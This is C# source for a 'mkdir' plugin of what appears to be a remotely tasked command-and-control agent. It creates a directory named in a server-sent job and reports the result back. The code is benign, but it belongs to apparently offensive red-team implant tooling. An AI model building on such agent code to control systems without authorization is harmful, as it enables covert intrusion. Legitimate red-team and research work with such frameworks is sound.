﻿

using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "mkdir";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                if (args.ContainsKey("path"))
                {
                    DirectoryInfo dir = Directory.CreateDirectory(args["path"].Replace("\"", ""));

                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        completed = true,
                        user_output = "Created directory " + dir.FullName,
                        task_id = job.task.id,
                    });
                }
                else
                {
                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        completed = true,
                        user_output = "No path provided.",
                        task_id = job.task.id,
                        status = "error"
                    });
                }
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }
        }
    }
}
